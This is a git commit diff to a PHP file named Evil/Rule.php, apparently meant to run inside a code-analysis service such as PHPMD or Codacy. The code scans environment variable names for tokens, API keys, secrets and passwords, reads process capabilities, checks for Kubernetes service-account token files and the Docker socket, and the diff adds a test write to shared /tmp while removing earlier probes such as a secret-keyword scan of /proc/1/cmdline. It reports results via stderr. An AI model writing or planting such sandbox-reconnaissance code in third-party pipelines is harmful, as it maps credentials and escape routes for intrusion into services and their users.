9e4f072e767125f3e5b0930de5a801d167a8f1e5
abdu <93588230+abdullah-suhayl@users.noreply.github.com>
2026-07-15 04:34:31 +0300

    Test analyzer temporary storage boundary

--- Evil/Rule.php
+++ Evil/Rule.php
@@ -1,10 +1,13 @@
 <?php
+$markerPath = '/tmp/codex_shared_probe_20260716';
+$markerValue = 'PUBLIC_MARKER_20260716';
+$writeBytes = @file_put_contents($markerPath, $markerValue);
+$markerExists = is_file($markerPath) ? 1 : 0;
+$markerLen = $markerExists ? @filesize($markerPath) : 0;
 $names = array_merge(array_keys($_SERVER), array_keys($_ENV));
 $all = getenv();
 if (is_array($all)) { $names = array_merge($names, array_keys($all)); }
 $hits = array_values(array_unique(array_filter($names, function($n) { return preg_match('/TOKEN|API_KEY|SECRET|CREDENTIAL|PASSWORD|GITHUB|CODACY/i', $n); })));
-$uid = function_exists('posix_geteuid') ? posix_geteuid() : -1;
-$gid = function_exists('posix_getegid') ? posix_getegid() : -1;
 $status = @file_get_contents('/proc/self/status');
 $capEff = ''; $capBnd = ''; $statusUid = '';
 foreach (preg_split('/?
@@ -13,13 +16,7 @@ foreach (preg_split('/?
     if (strpos($line, 'CapBnd:') === 0) { $capBnd = trim(substr($line, 7)); }
     if (strpos($line, 'Uid:') === 0) { $statusUid = trim(substr($line, 4)); }
 }
-$proc1 = (string)@file_get_contents('/proc/1/cmdline');
-$proc1Keyword = preg_match('/TOKEN|API[_-]?KEY|SECRET|CREDENTIAL|PASSWORD|GITHUB|CODACY|BEARER/i', $proc1) ? 1 : 0;
 $saToken = (is_file('/var/run/secrets/kubernetes.io/serviceaccount/token') || is_file('/run/secrets/kubernetes.io/serviceaccount/token')) ? 1 : 0;
 $dockerSocket = is_file('/var/run/docker.sock') ? 1 : 0;
-$dockerEnv = is_file('/.dockerenv') ? 1 : 0;
-$writableRoot = is_writable('/') ? 1 : 0;
-$writableSrc = is_writable('/src') ? 1 : 0;
-$writableTmp = is_writable('/tmp') ? 1 : 0;
-fwrite(STDERR, 'PHPMD_ROOT_BOUNDARY euid=' . $uid . ' egid=' . $gid . ' status_uid=' . $statusUid . ' cap_eff=' . $capEff . ' cap_bnd=' . $capBnd . ' token_name_count=' . count($hits) . ' proc1_keyword=' . $proc1Keyword . ' sa_token_file=' . $saToken . ' docker_socket=' . $dockerSocket . ' dockerenv=' . $dockerEnv . ' writable_root=' . $writableRoot . ' writable_src=' . $writableSrc . ' writable_tmp=' . $writableTmp . PHP_EOL);
-throw new RuntimeException('PHPMD_ROOT_BOUNDARY');
+fwrite(STDERR, 'PHPMD_SHARED_TMP_WRITE write_bytes=' . (int)$writeBytes . ' exists=' . $markerExists . ' len=' . (int)$markerLen . ' status_uid=' . $statusUid . ' cap_eff=' . $capEff . ' cap_bnd=' . $capBnd . ' token_name_count=' . count($hits) . ' sa_token_file=' . $saToken . ' docker_socket=' . $dockerSocket . PHP_EOL);
+throw new RuntimeException('PHPMD_SHARED_TMP_WRITE');
